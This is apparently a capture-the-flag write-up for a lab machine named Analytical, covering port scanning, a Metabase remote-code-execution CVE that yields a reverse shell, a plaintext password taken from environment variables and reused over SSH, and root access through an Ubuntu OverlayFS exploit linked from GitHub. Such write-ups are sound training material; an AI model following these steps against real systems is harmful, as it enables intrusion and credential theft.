# NMAP

TARGET: 10.129.229.224
ME: 10.10.14.139

```
└─$ sudo nmap -sC -sV 10.129.229.224 -p- -Pn -max-retries 1
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 03:11 -0400
Warning: 10.129.229.224 giving up on port because retransmission cap hit (1).
Nmap scan report for analytical.htb (10.129.229.224)
Host is up (0.030s latency).
Not shown: 65136 closed tcp ports (reset), 397 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.07 seconds
```

# Port 80

analytical.htb has some list of "staff" allowing for username generation via username_anarchy

Also has a login on a different subdomain (virtual host) at data.analytical.htb

This login page shows it is a metabase instance which is a data analytics platform with vulns in the past

This seems vulnerable to an unauthenticated RCE [CVE-2023-38646](https://packetstorm.news/files/id/177138) as proven by running the exploit from packetstorm and getting a reverse shell back.

# Shell as metabase

shell showed in environment variables a login and password for metabase:

```
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=eb66505f375d
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=3
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Giving user metalytics : An4lytics_ds20223#

Logging in as this on the webUI got me in and let me discern the version is version v0.46.6

Using this password lets me into a shell as metalytics via ssh:

```
└─$ ssh metalytics@analytical.htb           
The authenticity of host 'analytical.htb (10.129.229.224)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'analytical.htb' (ED25519) to the list of known hosts.
metalytics@analytical.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jul  2 12:40:05 AM UTC 2026

  System load:              0.2451171875
  Usage of /:               93.1% of 7.78GB
  Memory usage:             27%
  Swap usage:               0%
  Processes:                157
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.229.224
  IPv6 address for eth0:    dead:beef::a0de:adff:fe69:94ce

  => / is using 93.1% of 7.78GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ whoami
metalytics
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ cat /etc/passwd
```

# Shell as metalytics

interestingly somehow the /etc/passwd file here is different than that of the shell as metabase from the RCE earlier. Might be a containerized deployment of metabase maybe.

Found an open port on localhost 3000:

```
metalytics@analytics:~$ ss -lntu
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:3000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                                 [::]:80                                                 [::]:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*   
```

This seems metabase related but also seems to be internal accessible only (curl command against it does seem to show it is a webserver for HTML/a website of some kind). Used ssh port forward to hit in browser but it ended up just being metabase again.

Deployed linpeas using wget to download it onto the box.

Found nothing useful here either and did a bit of digging around for a write.ul setGUID binary that linpeas found but it was a dead end. Generally found nothing here and started looking at versions of things available.

The OS and kernel versions with the word “vulnerability” led to a [Wiz article ](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability#vulnerability-2-cve-2023-32629-ovl_copy_up_meta_inode_data-56)on 2 vulns in the overlayFS filesystem which is interesting since the metabase app also seems to be a container. This led to CVE-2023-32629 and the [exploit](https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/master/exploit.sh) for it found on github. This exploit very quickly gave root.

```
metalytics@analytics:/tmp$ ./poc.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp# ls -la
total 1036
drwxrwxrwt 18 root       root         4096 Jul  2 01:35 .
drwxr-xr-x 18 root       root         4096 Aug  8  2023 ..
-rw-rw-r--  1 metalytics metalytics   2758 Jul  2 01:17 config.json
drwxrwxrwt  2 root       root         4096 Jul  2 00:10 .font-unix
drwxrwxrwt  2 root       root         4096 Jul  2 00:10 .ICE-unix
drwxrwxr-x  2 metalytics metalytics   4096 Jul  2 01:35 l
drwxrwxr-x  2 metalytics metalytics   4096 Jul  2 01:35 m
-rwxrwxr-x  1 metalytics metalytics 975444 Jan 10 22:47 peas.sh
-rwxrwxr-x  1 metalytics metalytics    558 Jul  2 01:35 poc.sh
drwxrwxr-x  2 metalytics metalytics   4096 Jul  2 01:17 rootfs
drwx------  3 root       root         4096 Jul  2 00:10 systemd-private-dae1fc672f9b4f04b1c86f5006e6c127-ModemManager.service-07PyZB
drwx------  3 root       root         4096 Jul  2 00:10 systemd-private-dae1fc672f9b4f04b1c86f5006e6c127-systemd-logind.service-vplBRH
drwx------  3 root       root         4096 Jul  2 00:10 systemd-private-dae1fc672f9b4f04b1c86f5006e6c127-systemd-resolved.service-9uFuA3
drwx------  3 root       root         4096 Jul  2 00:10 systemd-private-dae1fc672f9b4f04b1c86f5006e6c127-systemd-timesyncd.service-xVdu4x
drwxrwxrwt  2 root       root         4096 Jul  2 00:10 .Test-unix
drwx------  2 metalytics metalytics   4096 Jul  2 01:07 tmux-1000
drwxrwxr-x  2 metalytics metalytics   4096 Jul  2 01:35 u
drwx------  2 root       root         4096 Jul  2 00:10 vmware-root_430-558536591
drwxrwxr-x  3 metalytics metalytics   4096 Jul  2 01:35 w
drwxrwxrwt  2 root       root         4096 Jul  2 00:10 .X11-unix
drwxrwxrwt  2 root       root         4096 Jul  2 00:10 .XIM-unix
root@analytics:/tmp# cd ..
root@analytics:/# cd root
root@analytics:/root# ls
root.txt
```

==DONE==